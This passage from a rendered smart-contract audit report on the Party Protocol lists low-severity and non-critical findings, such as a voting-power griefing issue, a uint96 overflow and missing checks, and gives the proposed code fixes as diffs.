instead of <code>delegate</code> when minting party card</h2>\n<p>The <code>ÌnitialETHCrowdfund._contribute</code> function currently uses <code>delegate</code> as the delegate when minting a party card <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L302\">Link</a>.  </p>\n<p>This is wrong. Instead <code>delegationsByContributor[contributor]</code> should be used. This is because if User A contributes for another User B and User B has already set a delegate, i.e. <code>delegationsByContributor[contributor]!=address(0)</code> then this delegate should be used and not the <code>delegate</code> parameter supplied by User A.  </p>\n<p>However I don’t see any impact in this behavior because if <code>delegationsByContributor[contributor]!=address(0)</code> then the party also has a delegate set for the <code>contributor</code>. And so this delegate is used above the delegate from the crowdfund anyway. So this finding is Low severity at most.  </p>\n<p>Fix:  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 8ab3b5c..6c76e88 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -299,7 +299,7 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (tokenId == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Mint contributor a new party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            party.mint(contributor, votingPower, delegate);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            party.mint(contributor, votingPower, delegationsByContributor[contributor]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else if (disableContributingForExistingCard) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             revert ContributingForExistingCardDisabledError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         } else if (party.ownerOf(tokenId) == contributor) {</span></span></span></code></pre>\n<h2 id=\"l-05-attacker-can-decide-how-voting-power-is-distributed-across-party-cards-griefing-attack\" style=\"position:relative;\"><a href=\"#l-05-attacker-can-decide-how-voting-power-is-distributed-across-party-cards-griefing-attack\" aria-label=\"l 05 attacker can decide how voting power is distributed across party cards griefing attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Attacker can decide how voting power is distributed across party cards (griefing attack)</h2>\n<p>In the <code>ReraiseETHCrowdfund</code> contract the party cards are not minted immediately.<br>\nThe user first gets a crowdfund NFT and later when the crowdfund is won the voting power can be “claimed” which means the actual party cards are minted.  </p>\n<p>Voting power is claimed with the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L303\"><code>ReraiseETHCrowdfund.claim</code></a> or <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L333-L382\"><code>ReraiseETHCrowdfund.claimMultiple</code></a> function.  </p>\n<p>The issue arises from the fact that any User A can claim the party cards of any other User B.<br>\nAnd User A can also decide how the voting power is distributed across party cards (within the limits set in the contract).  </p>\n<p>Also party cards cannot be reorganized. When a party card has voting power 10 it has voting power 10 forever. It is not possible to divide this party card into two party cards with voting power 5 each.<br>\nSimilarly two party cards cannot be merged into one.  </p>\n<p>From the above observations we can understand how this leads to a problem: A User A may want to have 10 party cards with 1 voting power each so he can transfer them individually if needed. The attacker can do a griefing attack and claim 1 party card with voting power 10 so the party card cannot be used as intended.  </p>\n<p>The sponsor explained that it is important that anyone can claim party cards so this is not something we can restrict.  </p>\n<p>Also I have been told that they have considered for while to allow reorganizing party cards.<br>\nTherefore I encourage them to actually implement reorganizing party cards.  </p>\n<p>Thereby it is ensured that if this griefing attack occurs a user can reorganize his party cards and use them as intended.  </p>\n<h2 id=\"l-06-use-uint256-for-computations-such-that-voting-power-can-be-all-values-in-uint96-range\" style=\"position:relative;\"><a href=\"#l-06-use-uint256-for-computations-such-that-voting-power-can-be-all-values-in-uint96-range\" aria-label=\"l 06 use uint256 for computations such that voting power can be all values in uint96 range permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Use <code>uint256</code> for computations such that voting power can be all values in <code>uint96</code> range</h2>\n<p>The voting power in a party is managed in <code>uint96</code> variables.  </p>\n<p>When we look at the <code>PartyGovernance._areVotesPassing</code> function we can see that for the computation the <code>uint96</code> variables are cast to <code>uint256</code>:  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1048-L1054\">Link</a>  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_areVotesPassing</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">passThresholdBps</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voteCount</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">) &gt;= </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">passThresholdBps</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This is done such that there is no intermediate overflow. If there was no cast, the multiplication <code>voteCount * 1e4</code> could overflow and cause a DOS to the Party when <code>voteCount</code> is close to <code>type(uint96).max = ~ 7.9e28</code>.  </p>\n<p>The issue is in the <code>PartyGovernance._isUnanimousVotes</code> function which does not convert the voting power to <code>uint256</code> and is therefore prone to overflow:  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L1037-L1046\">Link</a>  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isUnanimousVotes</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalVotes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalVotingPower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">acceptanceRatio</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalVotes</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e4</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If &gt;= 99.99% acceptance, consider it unanimous.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The minting formula for voting power is a bit lossy, so we check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// for slightly less than 100%.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">acceptanceRatio</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">0.9999e4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>As long as the mint authorities ensure that the number of votes stays within the safe range (<code>7.9e28 / 1e4 = ~7.9e24</code>) this is not a poblem. However the way the <code>_areVotesPassing</code> function works shows that the whole <code>uint96</code> range should be safe.  </p>\n<p>Therefore I propose the following change to the <code>_isUnanimousVotes</code> function:  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/party/PartyGovernance.sol b/contracts/party/PartyGovernance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index e251646..7571fa8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/party/PartyGovernance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/party/PartyGovernance.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -1038,7 +1038,7 @@ abstract contract PartyGovernance is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 totalVotes,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 totalVotingPower</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) private pure returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256 acceptanceRatio = (totalVotes * 1e4) / totalVotingPower;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 acceptanceRatio = (uint256(totalVotes) * 1e4) / uint256(totalVotingPower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // If &gt;= 99.99% acceptance, consider it unanimous.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // The minting formula for voting power is a bit lossy, so we check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // for slightly less than 100%.</span></span></span></code></pre>\n<h2 id=\"l-07-allow-specifying-maximumprice-for-individual-nfts\" style=\"position:relative;\"><a href=\"#l-07-allow-specifying-maximumprice-for-individual-nfts\" aria-label=\"l 07 allow specifying maximumprice for individual nfts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] Allow specifying <code>maximumPrice</code> for individual NFTs</h2>\n<p>Currently it is only possible to specify a single <code>maximumPrice</code> for all NFTs in the <code>CollectionBatchBuyOperator</code> contract (<a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L25-L26\">Link</a>).  </p>\n<p>I recommend that it should be possible to specify a <code>maximumPrice</code> for each NFT individually. Thereby it’s possible for the party to enforce tighter limits to the amount of ETH that the executor can spend.  </p>\n<p>For example the NFT with <code>id=1</code> might require a maximum price of <code>1 ETH</code> whereas for another NFT with <code>id=2</code> a maximum price of <code>0.1 ETH</code> can be sufficient.  </p>\n<p>Currently both NFTs can only have the same maximum price and the executor is able to spend <code>2 ETH</code> at a maximum. This could be further restricted to minimize the trust that needs to be put into the executor.  </p>\n<p>This can be implemented by introducing a new <code>mapping(uint256 => uint256) maximumPrices</code> mapping. If the entry for an NFT is <code>!= 0</code> it should be used as the maximum price. Otherwise <code>maximumPrice</code> can be used as a fallback.  </p>\n<h2 id=\"n-01-introduce-separate-vetothresholdbps-for-vetoing-a-proposal\" style=\"position:relative;\"><a href=\"#n-01-introduce-separate-vetothresholdbps-for-vetoing-a-proposal\" aria-label=\"n 01 introduce separate vetothresholdbps for vetoing a proposal permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] Introduce separate <code>vetoThresholdBps</code> for vetoing a proposal</h2>\n<p>Currently the same <a href=\"https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/party/PartyGovernance.sol#L81\"><code>passThresholdBps</code></a> variable is used for accepting proposals as well as vetoing proposals.  </p>\n<p><code>passTresholdBps</code> is a percentage of the <code>totalVotingPower</code> that is required.  </p>\n<p>I recommend to introduce a separate <code>vetoThresholdBps</code> governance parameter that is used to determine the percentage of votes necessary to veto a proposal.  </p>\n<p>Using separate thresholds allows for greater flexibility.  </p>\n<p>E.g. a Party might want a high consensus of 60% to accept a proposal but might want to require only 10% of votes to veto a proposal. Such a setup is not possible currently which unnecessarily restricts the flexibility of the protocol.  </p>\n<h2 id=\"n-02-operationexecuted-event-is-defined-but-never-emitted\" style=\"position:relative;\"><a href=\"#n-02-operationexecuted-event-is-defined-but-never-emitted\" aria-label=\"n 02 operationexecuted event is defined but never emitted permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] <code>OperationExecuted</code> event is defined but never emitted</h2>\n<p>In the <code>OperatorProposal</code> contract the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L20\"><code>OperationExecuted</code></a> event is defined but it is never emitted.  </p>\n<p>Therefore I recommend to emit this event when the operation is executed successfully.  </p>\n<p>Fix:  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/proposals/OperatorProposal.sol b/contracts/proposals/OperatorProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 23e2897..5899bec 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/proposals/OperatorProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/proposals/OperatorProposal.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -44,6 +44,8 @@ contract OperatorProposal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Execute the operation.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit OperationExecuted(msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Nothing left to do.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return &quot;&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"n-03-use-transfereth-instead-of-transfer-for-transferring-eth\" style=\"position:relative;\"><a href=\"#n-03-use-transfereth-instead-of-transfer-for-transferring-eth\" aria-label=\"n 03 use transfereth instead of transfer for transferring eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-03] Use <code>transferEth</code> instead of <code>transfer</code> for transferring ETH</h2>\n<p>The <a href=\"https://gist.github.com/HollaDieWaldfee100/673ab665890ab92d5f3f82c8736ffea5#L-2\">automated findings</a> have flagged the below instances as unsafe ERC20 operations.  </p>\n<p>This is wrong. They are not ERC20 operations. Instead they are just the <code>transfer</code> function that is a built-in Solidity function for sending ETH.  </p>\n<p>However the usage of this function is still <a href=\"https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\">discouraged</a> because it limits the Gas that the callee can consume to <code>2300</code>.  </p>\n<p>Instead use the <code>transferEth</code> function that is used elsewhere in the codebase to transfer ETH.  </p>\n<p>There are 4 instances:<br>\n<a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L204\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L204</a>  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L267\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L267</a>  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L152\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L152</a>  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L201\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L201</a>  </p>\n<h2 id=\"n-04-check-that-none-of-the-authorities-is-zero-address\" style=\"position:relative;\"><a href=\"#n-04-check-that-none-of-the-authorities-is-zero-address\" aria-label=\"n 04 check that none of the authorities is zero address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-04] Check that none of the <code>authorities</code> is zero address</h2>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyFactory.sol#L18-L45\"><code>PartyFactory.createParty</code></a> function should check that the <code>authorities</code> array contains addresses that are not the zero address.  </p>\n<p>I mention this because in the previous version of the <code>PartyFactory</code> contract, there was only one <code>authority</code> and it was checked to not be the zero address such as to ensure that governance NFTs can be minted:  </p>\n<p><a href=\"https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/party/PartyFactory.sol#L33-L35\">Link</a>  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">authority</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidAuthorityError</span><span class=\"mtk1\">(</span><span class=\"mtk12\">authority</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>However now it is only checked that the <code>authorities</code> array is not empty:  </p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyFactory.sol#L26-L28\">Link</a>  </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">authorities</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NoAuthorityError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>I think you should check that there is no zero address in this array. The current check is not sufficient when compared to what has been checked previously. The current check is weaker.  </p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/14#issuecomment-1515456383\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 2 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/23\">report highlighted below</a> by <strong>HollaDieWaldfee</strong> received the top score from the judge.</p>\n<p><em>The following warden also submitted a report: <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/41\">hansfriese</a>.</em></p>\n<h2 id=\"g-01-use-maxtotalcontributations_-memory-variable-instead-of-maxtotalcontributions\" style=\"position:relative;\"><a 